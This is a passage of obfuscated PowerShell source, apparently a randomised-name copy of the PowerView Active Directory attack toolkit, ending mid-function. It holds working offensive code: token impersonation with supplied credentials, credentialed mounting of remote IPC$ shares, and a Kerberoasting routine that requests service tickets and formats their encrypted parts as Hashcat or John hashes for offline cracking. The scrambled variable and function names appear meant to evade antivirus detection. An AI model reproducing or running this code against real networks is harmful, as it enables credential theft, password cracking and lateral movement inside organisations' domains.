        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $XEQn7MoPDNhlYtSpOmwmF5wv5,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Hut = @{}
        if ($PSBoundParameters['Domain']) { $Hut['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $Hut['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Credential']) { $Hut['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        ForEach ($jp9jiurTsXvElqD in $XEQn7MoPDNhlYtSpOmwmF5wv5) {
            $jp9jiurTsXvElqD = $jp9jiurTsXvElqD -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $Is3MHqRhWXOH = Convert-ADName -S $jp9jiurTsXvElqD -YSu8jzco2Jt 'DN' @DomainSearcherArguments
                if ($Is3MHqRhWXOH) {
                    $hZmS = $Is3MHqRhWXOH.SubString($Is3MHqRhWXOH.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $mOi9D = $Is3MHqRhWXOH.Split(',')[0].split('=')[1]

                    $Hut['Identity'] = $mOi9D
                    $Hut['Domain'] = $hZmS
                    $Hut['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($jp9jiurTsXvElqD.Contains('\')) {
                        $3Ecdwi8qNy = $jp9jiurTsXvElqD.Split('\')[0]
                        $jp9jiurTsXvElqD = $jp9jiurTsXvElqD.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $Hut = @{}
                        $3Ecdwi8qNy = (Get-3Ecdwi8qNy @DomainSearcherArguments).Name
                    }

                    $AekFROunIpME = (New-Object System.Security.Principal.NTAccount($3Ecdwi8qNy, $jp9jiurTsXvElqD))
                    $AekFROunIpME.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $3Ecdwi8qNy\$jp9jiurTsXvElqD : $_"
                }
            }
        }
    }
}


function ConvertFrom-SID {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $iQFdt,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $iA8aCAaRdB = @{}
        if ($PSBoundParameters['Domain']) { $iA8aCAaRdB['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $iA8aCAaRdB['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Credential']) { $iA8aCAaRdB['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        ForEach ($iGUxNunanZGLKeqKM in $iQFdt) {
            $iGUxNunanZGLKeqKM = $iGUxNunanZGLKeqKM.trim('*')
            try {
                
                Switch ($iGUxNunanZGLKeqKM) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -S $iGUxNunanZGLKeqKM @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$iGUxNunanZGLKeqKM' : $_"
            }
        }
    }
}


function Convert-ADName {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $S,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $YSu8jzco2Jt,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ih827gYoGVVol3 = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function Invoke-b07KAXTqvUWxSfk([__ComObject] $jp9jiurTsXvElqD, [String] $b07KAXTqvUWxSfk, $9Epm5UPaiRKDgQn08olY) {
            $HLkP8yYwFiBnjz2lL = $qYFR5PCZruUkdna9T
            $HLkP8yYwFiBnjz2lL = $jp9jiurTsXvElqD.GetType().InvokeMember($b07KAXTqvUWxSfk, 'InvokeMethod', $qYFR5PCZruUkdna9T, $jp9jiurTsXvElqD, $9Epm5UPaiRKDgQn08olY)
            Write-Output $HLkP8yYwFiBnjz2lL
        }

        function Get-Property([__ComObject] $jp9jiurTsXvElqD, [String] $t9fePIf) {
            $jp9jiurTsXvElqD.GetType().InvokeMember($t9fePIf, 'GetProperty', $qYFR5PCZruUkdna9T, $jp9jiurTsXvElqD, $qYFR5PCZruUkdna9T)
        }

        function Set-Property([__ComObject] $jp9jiurTsXvElqD, [String] $t9fePIf, $9Epm5UPaiRKDgQn08olY) {
            [Void] $jp9jiurTsXvElqD.GetType().InvokeMember($t9fePIf, 'SetProperty', $qYFR5PCZruUkdna9T, $jp9jiurTsXvElqD, $9Epm5UPaiRKDgQn08olY)
        }

        
        if ($PSBoundParameters['Server']) {
            $lGqiM1QAzfn = 2
            $yY = $Gkd0Hz5f
        }
        elseif ($PSBoundParameters['Domain']) {
            $lGqiM1QAzfn = 1
            $yY = $3Ecdwi8qNy
        }
        elseif ($PSBoundParameters['Credential']) {
            $36vEW0mAS = $3ezVSfm6f4k.GetNetworkCredential()
            $lGqiM1QAzfn = 1
            $yY = $36vEW0mAS.Domain
        }
        else {
            
            $lGqiM1QAzfn = 3
            $yY = $qYFR5PCZruUkdna9T
        }
    }

    PROCESS {
        ForEach ($IV8bExmIv1dreDEsWN1Stc in $S) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($IV8bExmIv1dreDEsWN1Stc -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $P92t0roaA = $ih827gYoGVVol3['DomainSimple']
                }
                else {
                    $P92t0roaA = $ih827gYoGVVol3['NT4']
                }
            }
            else {
                $P92t0roaA = $ih827gYoGVVol3[$YSu8jzco2Jt]
            }

            $qPTXv8dKQga1uUBaC = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $36vEW0mAS = $3ezVSfm6f4k.GetNetworkCredential()

                    Invoke-b07KAXTqvUWxSfk $qPTXv8dKQga1uUBaC 'InitEx' (
                        $lGqiM1QAzfn,
                        $yY,
                        $36vEW0mAS.UserName,
                        $36vEW0mAS.Domain,
                        $36vEW0mAS.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$S' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $qYFR5PCZruUkdna9T = Invoke-b07KAXTqvUWxSfk $qPTXv8dKQga1uUBaC 'Init' (
                        $lGqiM1QAzfn,
                        $yY
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$S' : $_"
                }
            }

            
            Set-Property $qPTXv8dKQga1uUBaC 'ChaseReferral' (0x60)

            try {
                
                $qYFR5PCZruUkdna9T = Invoke-b07KAXTqvUWxSfk $qPTXv8dKQga1uUBaC 'Set' (8, $IV8bExmIv1dreDEsWN1Stc)
                Invoke-b07KAXTqvUWxSfk $qPTXv8dKQga1uUBaC 'Get' ($P92t0roaA)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$IV8bExmIv1dreDEsWN1Stc' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {


    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $BqU,

        [Switch]
        $p951fm5Wc0SxsiFOmVMvL
    )

    BEGIN {
        
        $5Kn6gU2ELzPJrsvl3a = New-Object System.Collections.Specialized.OrderedDictionary
        $5Kn6gU2ELzPJrsvl3a.Add("SCRIPT", 1)
        $5Kn6gU2ELzPJrsvl3a.Add("ACCOUNTDISABLE", 2)
        $5Kn6gU2ELzPJrsvl3a.Add("HOMEDIR_REQUIRED", 8)
        $5Kn6gU2ELzPJrsvl3a.Add("LOCKOUT", 16)
        $5Kn6gU2ELzPJrsvl3a.Add("PASSWD_NOTREQD", 32)
        $5Kn6gU2ELzPJrsvl3a.Add("PASSWD_CANT_CHANGE", 64)
        $5Kn6gU2ELzPJrsvl3a.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $5Kn6gU2ELzPJrsvl3a.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $5Kn6gU2ELzPJrsvl3a.Add("NORMAL_ACCOUNT", 512)
        $5Kn6gU2ELzPJrsvl3a.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $5Kn6gU2ELzPJrsvl3a.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $5Kn6gU2ELzPJrsvl3a.Add("SERVER_TRUST_ACCOUNT", 8192)
        $5Kn6gU2ELzPJrsvl3a.Add("DONT_EXPIRE_PASSWORD", 65536)
        $5Kn6gU2ELzPJrsvl3a.Add("MNS_LOGON_ACCOUNT", 131072)
        $5Kn6gU2ELzPJrsvl3a.Add("SMARTCARD_REQUIRED", 262144)
        $5Kn6gU2ELzPJrsvl3a.Add("TRUSTED_FOR_DELEGATION", 524288)
        $5Kn6gU2ELzPJrsvl3a.Add("NOT_DELEGATED", 1048576)
        $5Kn6gU2ELzPJrsvl3a.Add("USE_DES_KEY_ONLY", 2097152)
        $5Kn6gU2ELzPJrsvl3a.Add("DONT_REQ_PREAUTH", 4194304)
        $5Kn6gU2ELzPJrsvl3a.Add("PASSWORD_EXPIRED", 8388608)
        $5Kn6gU2ELzPJrsvl3a.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $5Kn6gU2ELzPJrsvl3a.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $I61pJhZcouCENKOnS = New-Object System.Collections.Specialized.OrderedDictionary

        if ($p951fm5Wc0SxsiFOmVMvL) {
            ForEach ($Jwv4XHmkge9naNIru5oT in $5Kn6gU2ELzPJrsvl3a.GetEnumerator()) {
                if ( ($BqU -band $Jwv4XHmkge9naNIru5oT.Value) -eq $Jwv4XHmkge9naNIru5oT.Value) {
                    $I61pJhZcouCENKOnS.Add($Jwv4XHmkge9naNIru5oT.Name, "$($Jwv4XHmkge9naNIru5oT.Value)+")
                }
                else {
                    $I61pJhZcouCENKOnS.Add($Jwv4XHmkge9naNIru5oT.Name, "$($Jwv4XHmkge9naNIru5oT.Value)")
                }
            }
        }
        else {
            ForEach ($Jwv4XHmkge9naNIru5oT in $5Kn6gU2ELzPJrsvl3a.GetEnumerator()) {
                if ( ($BqU -band $Jwv4XHmkge9naNIru5oT.Value) -eq $Jwv4XHmkge9naNIru5oT.Value) {
                    $I61pJhZcouCENKOnS.Add($Jwv4XHmkge9naNIru5oT.Name, "$($Jwv4XHmkge9naNIru5oT.Value)")
                }
            }
        }
        $I61pJhZcouCENKOnS
    }
}


function Get-PrincipalContext {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    Add-fK67iX -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($S -match '.+\\.+')) {
            if ($S -match '.+\\.+') {
                
                $34TOhkz = $S | Convert-ADName -YSu8jzco2Jt Canonical
                if ($34TOhkz) {
                    $2qxWryI8ozslU0FEZCnup9bw7 = $34TOhkz.SubString(0, $34TOhkz.IndexOf('/'))
                    $M7Ro5ydpDIP1A = $S.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$2qxWryI8ozslU0FEZCnup9bw7'"
                }
            }
            else {
                $M7Ro5ydpDIP1A = $S
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$3Ecdwi8qNy'"
                $2qxWryI8ozslU0FEZCnup9bw7 = $3Ecdwi8qNy
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $1tGa = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $2qxWryI8ozslU0FEZCnup9bw7, $3ezVSfm6f4k.UserName, $3ezVSfm6f4k.GetNetworkCredential().Password)
            }
            else {
                $1tGa = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $2qxWryI8ozslU0FEZCnup9bw7)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $seGOapti3gukocF = Get-3Ecdwi8qNy | Select-Object -ExpandProperty Name
                $1tGa = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $seGOapti3gukocF, $3ezVSfm6f4k.UserName, $3ezVSfm6f4k.GetNetworkCredential().Password)
            }
            else {
                $1tGa = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $M7Ro5ydpDIP1A = $S
        }

        $TxOjsKu13lUSJ8MHybpYNF = New-Object PSObject
        $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Context' $1tGa
        $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Identity' $M7Ro5ydpDIP1A
        $TxOjsKu13lUSJ8MHybpYNF
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$S') context : $_"
    }
}


function Add-RemoteConnection {


    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $a9LvymtQdGPNr8cqgsI,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k
    )

    BEGIN {
        $NiO4qbKTnxwp5MFHfCo8vWY = [Activator]::CreateInstance($a50S)
        $NiO4qbKTnxwp5MFHfCo8vWY.dwType = 1
    }

    PROCESS {
        $v1kjZv1bvvwNrkUK8hHd = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($ADW7xvL9odTzudB2mHd6ET in $mA) {
                $ADW7xvL9odTzudB2mHd6ET = $ADW7xvL9odTzudB2mHd6ET.Trim('\')
                $v1kjZv1bvvwNrkUK8hHd += ,"\\$ADW7xvL9odTzudB2mHd6ET\IPC$"
            }
        }
        else {
            $v1kjZv1bvvwNrkUK8hHd += ,$a9LvymtQdGPNr8cqgsI
        }

        ForEach ($XhfGVE in $v1kjZv1bvvwNrkUK8hHd) {
            $NiO4qbKTnxwp5MFHfCo8vWY.lpRemoteName = $XhfGVE
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $XhfGVE"

            
            
            $2KUDvV2HojTSzhMzNmslFPRL = $h7lPxhPwY20X::WNetAddConnection2W($NiO4qbKTnxwp5MFHfCo8vWY, $3ezVSfm6f4k.GetNetworkCredential().Password, $3ezVSfm6f4k.UserName, 4)

            if ($2KUDvV2HojTSzhMzNmslFPRL -eq 0) {
                Write-Verbose "$XhfGVE successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $XhfGVE : $(([ComponentModel.Win32Exception]$2KUDvV2HojTSzhMzNmslFPRL).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $a9LvymtQdGPNr8cqgsI
    )

    PROCESS {
        $v1kjZv1bvvwNrkUK8hHd = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($ADW7xvL9odTzudB2mHd6ET in $mA) {
                $ADW7xvL9odTzudB2mHd6ET = $ADW7xvL9odTzudB2mHd6ET.Trim('\')
                $v1kjZv1bvvwNrkUK8hHd += ,"\\$ADW7xvL9odTzudB2mHd6ET\IPC$"
            }
        }
        else {
            $v1kjZv1bvvwNrkUK8hHd += ,$a9LvymtQdGPNr8cqgsI
        }

        ForEach ($XhfGVE in $v1kjZv1bvvwNrkUK8hHd) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $XhfGVE"
            $2KUDvV2HojTSzhMzNmslFPRL = $h7lPxhPwY20X::WNetCancelConnection2($XhfGVE, 0, $True)

            if ($2KUDvV2HojTSzhMzNmslFPRL -eq 0) {
                Write-Verbose "$XhfGVE successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $XhfGVE : $(([ComponentModel.Win32Exception]$2KUDvV2HojTSzhMzNmslFPRL).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $5,

        [Switch]
        $N1xWHfZFbIiRSwgEOjKdtk
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $dpX5dTvap8TJNAoBJHC = $5
    }
    else {
        $dpX5dTvap8TJNAoBJHC = [IntPtr]::Zero
        $tG42xjNlHWe = $3ezVSfm6f4k.GetNetworkCredential()
        $hZmS = $tG42xjNlHWe.Domain
        $mOi9D = $tG42xjNlHWe.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($hZmS)\$($mOi9D)"

        
        
        $2KUDvV2HojTSzhMzNmslFPRL = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::LogonUser($mOi9D, $hZmS, $tG42xjNlHWe.Password, 9, 3, [ref]$dpX5dTvap8TJNAoBJHC);$ZPR8SXJ1J = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $2KUDvV2HojTSzhMzNmslFPRL) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
        }
    }

    
    $2KUDvV2HojTSzhMzNmslFPRL = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::ImpersonateLoggedOnUser($dpX5dTvap8TJNAoBJHC)

    if (-not $2KUDvV2HojTSzhMzNmslFPRL) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $dpX5dTvap8TJNAoBJHC
}


function Invoke-RevertToSelf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $5
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $2KUDvV2HojTSzhMzNmslFPRL = $G8R::CloseHandle($5)
    }

    $2KUDvV2HojTSzhMzNmslFPRL = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::RevertToSelf();$ZPR8SXJ1J = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $2KUDvV2HojTSzhMzNmslFPRL) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get-DomainSPNTicket {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $LCkz1xqdPM7K4jH,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $JdyVW2BmJzGuYVvoHvD,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $lf6IXxnozrHwY5j = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $qYFR5PCZruUkdna9T = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $gmeJ8wNlI6aVtb = $JdyVW2BmJzGuYVvoHvD
        }
        else {
            $gmeJ8wNlI6aVtb = $LCkz1xqdPM7K4jH
        }

        ForEach ($jp9jiurTsXvElqD in $gmeJ8wNlI6aVtb) {
            if ($PSBoundParameters['User']) {
                $1Z9VM8GLB1GKshAL = $jp9jiurTsXvElqD.ServicePrincipalName
                $2 = $jp9jiurTsXvElqD.SamAccountName
                $Tm17BPMwz8VWplgQ2h = $jp9jiurTsXvElqD.DistinguishedName
            }
            else {
                $1Z9VM8GLB1GKshAL = $jp9jiurTsXvElqD
                $2 = 'UNKNOWN'
                $Tm17BPMwz8VWplgQ2h = 'UNKNOWN'
            }

            
            if ($1Z9VM8GLB1GKshAL -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $1Z9VM8GLB1GKshAL = $1Z9VM8GLB1GKshAL[0]
            }

            try {
                $OR011dUVA4482EOcyVY1 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $1Z9VM8GLB1GKshAL
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$1Z9VM8GLB1GKshAL' from user '$Tm17BPMwz8VWplgQ2h' : $_"
            }
            if ($OR011dUVA4482EOcyVY1) {
                $SvrBnkyJd = $OR011dUVA4482EOcyVY1.GetRequest()
            }
            if ($SvrBnkyJd) {
                $TxOjsKu13lUSJ8MHybpYNF = New-Object PSObject

                $1Wv = [System.BitConverter]::ToString($SvrBnkyJd) -replace '-'

                $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'SamAccountName' $2
                $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'DistinguishedName' $Tm17BPMwz8VWplgQ2h
                $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'ServicePrincipalName' $OR011dUVA4482EOcyVY1.ServicePrincipalName

                
                
                if($1Wv -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Sbry3cNYIldxTQjq = [Convert]::ToByte( $CGto8ucDihpC.EtypeLen, 16 )
                    $JFn = [Convert]::ToUInt32($CGto8ucDihpC.CipherTextLen, 16)-4
                    $HWAvqw6iLkJ = $CGto8ucDihpC.DataToEnd.Substring(0,$JFn*2)

                    
                    if($CGto8ucDihpC.DataToEnd.Substring($JFn*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($OR011dUVA4482EOcyVY1.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $RvbGOdce324ca7APK3 = $qYFR5PCZruUkdna9T
                        $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($SvrBnkyJd).Replace('-',''))
                    } else {
                        $RvbGOdce324ca7APK3 = "$($HWAvqw6iLkJ.Substring(0,32))`$$($HWAvqw6iLkJ.Substring(32))"
